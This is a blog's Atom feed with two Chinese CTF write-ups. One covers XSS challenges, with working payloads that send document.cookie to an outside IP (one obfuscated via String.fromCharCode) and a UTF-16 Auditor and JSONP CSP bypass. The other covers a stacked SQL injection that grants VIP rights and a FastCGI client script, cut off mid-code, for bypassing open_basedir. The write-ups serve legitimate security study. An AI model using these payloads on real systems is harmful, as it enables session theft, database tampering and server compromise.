<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hpdoger</title>
  
  <subtitle>Valar Morghulis</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hpdoger.cn/"/>
  <updated>2019-10-09T14:23:26.225Z</updated>
  <id>https://hpdoger.cn/</id>
  
  <author>
    <name>Hpdoger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RealWorld CTF2019 两道XSS-Web题解</title>
    <link href="https://hpdoger.cn/2019/09/24/RealWorld%20CTF2019%20%E4%B8%A4%E9%81%93XSS-Web%E9%A2%98%E8%A7%A3/"/>
    <id>https://hpdoger.cn/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/</id>
    <published>2019-09-23T16:00:00.000Z</published>
    <updated>2019-10-09T14:23:26.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p><h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p><pre><code>&lt;script&gt;    var getUrlParam = function (name) {        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);        var r = unescape(window.location.search.substr(1)).match(reg);        if (r != null) return r[2];        return null;    }    function setCookie(name, value) {        var Days = 30;        var exp = new Date();        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();    }    function getCookie(name) {        var search = name + &quot;=&quot;        var offset = document.cookie.indexOf(search)        if (offset != -1) {            offset += search.length;            var end = document.cookie.indexOf(&quot;;&quot;, offset);            if (end == -1) {                end = document.cookie.length;            }            return unescape(document.cookie.substring(offset, end));        }        else return &quot;&quot;;    }    function setElement(tag) {        tag = tag.substring(0, 1);        var ele = document.createElement(tag)        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);        for (var i = 0; i &lt; attrs.length; i++) {            var key = attrs[i].split(&quot;=&quot;)[0];            var value = attrs[i].split(&quot;=&quot;)[1];            ele.setAttribute(key, value);        }        document.body.appendChild(ele);    }    var tag = getUrlParam(&quot;tag&quot;);    setCookie(&quot;tag&quot;, tag);    setElement(tag);&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p><pre><code>var tag = getUrlParam(&quot;tag&quot;);setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p><p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p><p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p><p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p><pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p><p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p><pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p><pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p><p>接着就是常规打cookie到本地</p><pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p><p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p><p>于此同时题目有两个难点需要bypass：</p><ul><li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li></ul><ul><li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li></ul><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p><p>于此同时Bypass auditor也算是出题人给我们的Hint。</p><p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p><p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p><p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p><pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p><pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p><p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p><p>此时我们来尝试一下能否Bypass XSS Auditor</p><pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p><p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p><p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p><pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p><p>接着就是把flag打到自己的本地就行了</p><pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RealWorld-CTF2019-两道XSS-Web题解&quot;&gt;&lt;a href=&quot;#RealWorld-CTF2019-两道XSS-Web题解&quot; class=&quot;headerlink&quot; title=&quot;RealWorld CTF2019 两道XSS-Web题解&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>从一道CTF学习Fastcgi绕过姿势</title>
    <link href="https://hpdoger.cn/2019/09/17/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E5%AD%A6%E4%B9%A0Fastcgi%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
    <id>https://hpdoger.cn/2019/09/17/从一道CTF学习Fastcgi绕过姿势/</id>
    <published>2019-09-16T16:00:00.000Z</published>
    <updated>2019-10-09T14:24:36.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p><p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p><p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p><p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p><p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p><p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p><p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p><p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p><p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p><pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227=&gt;UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p><h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p><p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p><p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p><p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p><p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p><p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p><p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p><h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p><h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p><p>在PHP中：</p><ul><li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p></li><li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p></li></ul><h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?phpclass TimedOutException extends \Exception {}class ForbiddenException extends \Exception {}class Client {const VERSION_1 = 1;const BEGIN_REQUEST = 1;const ABORT_REQUEST = 2;const END_REQUEST = 3;const PARAMS = 4;const STDIN = 5;const STDOUT = 6;const STDERR = 7;const DATA = 8;const GET_VALUES = 9;const GET_VALUES_RESULT = 10;const UNKNOWN_TYPE = 11;const MAXTYPE = self::UNKNOWN_TYPE;const RESPONDER = 1;const AUTHORIZER = 2;const FILTER = 3;const REQUEST_COMPLETE = 0;const CANT_MPX_CONN = 1;const OVERLOADED = 2;const UNKNOWN_ROLE = 3;const MAX_CONNS = &#39;MAX_CONNS&#39;;const MAX_REQS = &#39;MAX_REQS&#39;;const MPXS_CONNS = &#39;MPXS_CONNS&#39;;const HEADER_LEN = 8;const REQ_STATE_WRITTEN = 1;const REQ_STATE_OK = 2;const REQ_STATE_ERR = 3;const REQ_STATE_TIMED_OUT = 4;private $_sock = null;private $_host = null;private $_port = null;private $_keepAlive = false;private $_requests = array();private $_persistentSocket = false;private $_connectTimeout = 5000;private $_readWriteTimeout = 5000;public function __construct( $host, $port ) {    $this-&gt;_host = $host;    $this-&gt;_port = $port;}public function setKeepAlive( $b ) {          $this-&gt;_keepAlive = (boolean) $b;          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {              fclose( $this-&gt;_sock );    }}public function getKeepAlive() {    return $this-&gt;_keepAlive;}public function setPersistentSocket( $b ) {          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );          $this-&gt;_persistentSocket = (boolean) $b;          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {              fclose( $this-&gt;_sock );    }}public function getPersistentSocket() {    return $this-&gt;_persistentSocket;}public function setConnectTimeout( $timeoutMs ) {          $this-&gt;_connectTimeout = $timeoutMs;}public function getConnectTimeout() {    return $this-&gt;_connectTimeout;}public function setReadWriteTimeout( $timeoutMs ) {          $this-&gt;_readWriteTimeout = $timeoutMs;          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );}public function getReadWriteTimeout() {    return $this-&gt;_readWriteTimeout;}private function set_ms_timeout( $timeoutMs ) {          if ( ! $this-&gt;_sock ) {        return false;    }    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );}private function connect() {    if ( ! $this-&gt;_sock ) {              if ( $this-&gt;_persistentSocket ) {                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );              } else {                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );              }              if ( ! $this-&gt;_sock ) {                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );              }              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {            throw new \Exception( &#39;Unable to set timeout on socket&#39; );        }    }}private function buildPacket( $type, $content, $requestId = 1 ) {          $clen = strlen( $content );    return chr( self::VERSION_1 )         /* version */           . chr( $type )                    /* type */                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */                 . chr( 0 )                        /* paddingLength */                 . chr( 0 )                        /* reserved */                 . $content;                     /* content */}private function buildNvpair( $name, $value ) {    $nlen = strlen( $name );    $vlen = strlen( $value );    if ( $nlen &lt; 128 ) {              /* nameLengthB0 */              $nvpair = chr( $nlen );          } else {              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );          }          if ( $vlen &lt; 128 ) {        /* valueLengthB0 */        $nvpair .= chr( $vlen );    } else {        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );    }    /* nameData &amp; valueData */    return $nvpair . $name . $value;}private function readNvpair( $data, $length = null ) {    $array = array();          if ( $length === null ) {        $length = strlen( $data );    }    $p = 0;          while ( $p != $length ) {              $nlen = ord( $data{$p ++} );              if ( $nlen &gt;= 128 ) {                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );                  $nlen |= ( ord( $data{$p ++} ) );              }              $vlen = ord( $data{$p ++} );              if ( $vlen &gt;= 128 ) {                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );                  $vlen |= ( ord( $data{$p ++} ) );              }              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );              $p                                   += ( $nlen + $vlen );    }    return $array;}private function decodePacketHeader( $data ) {          $ret                  = array();          $ret[&#39;version&#39;]       = ord( $data{0} );          $ret[&#39;type&#39;]          = ord( $data{1} );          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );          $ret[&#39;paddingLength&#39;] = ord( $data{6} );          $ret[&#39;reserved&#39;]      = ord( $data{7} );    return $ret;}private function readPacket() {    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {        $resp            = $this-&gt;decodePacketHeader( $packet );              $resp[&#39;content&#39;] = &#39;&#39;;        if ( $resp[&#39;contentLength&#39;] ) {                  $len = $resp[&#39;contentLength&#39;];                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {                      $len             -= strlen( $buf );                      $resp[&#39;content&#39;] .= $buf;                  }              }              if ( $resp[&#39;paddingLength&#39;] ) {            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );        }        return $resp;    } else {        return false;    }}public function getValues( array $requestedInfo ) {          $this-&gt;connect();          $request = &#39;&#39;;          foreach ( $requestedInfo as $info ) {              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );          }          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );          $resp = $this-&gt;readPacket();          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );    } else {        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );    }}public function request( array $params, $stdin ) {    $id = $this-&gt;async_request( $params, $stdin );    return $this-&gt;wait_for_response( $id );}public function async_request( array $params, $stdin ) {    $this-&gt;connect();          // Pick random number between 1 and max 16 bit unsigned int 65535          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );    // Using persistent sockets implies you want them keept alive by server!    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )        , $id          );          $paramsRequest = &#39;&#39;;    foreach ( $params as $key =&gt; $value ) {              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );          }          if ( $paramsRequest ) {        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );    }    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );          if ( $stdin ) {        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );    }    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {        $info = stream_get_meta_data( $this-&gt;_sock );        if ( $info[&#39;timed_out&#39;] ) {                  throw new TimedOutException( &#39;Write timed out&#39; );              }              // Broken pipe, tear down so future requests might succeed              fclose( $this-&gt;_sock );        throw new \Exception( &#39;Failed to write request to socket&#39; );    }    $this-&gt;_requests[ $id ] = array(        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,        &#39;response&#39; =&gt; null    );    return $id;}public function wait_for_response( $requestId, $timeoutMs = 0 ) {    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {        throw new \Exception( &#39;Invalid request id given&#39; );    }    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR    ) {        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];    }    if ( $timeoutMs &gt; 0 ) {              // Reset timeout on socket for now              $this-&gt;set_ms_timeout( $timeoutMs );          } else {              $timeoutMs = $this-&gt;_readWriteTimeout;    }    $startTime = microtime( true );          do {              $resp = $this-&gt;readPacket();              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {                  if ( $resp[&#39;type&#39;] == self::STDERR ) {                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;                  }                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];              }              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {                  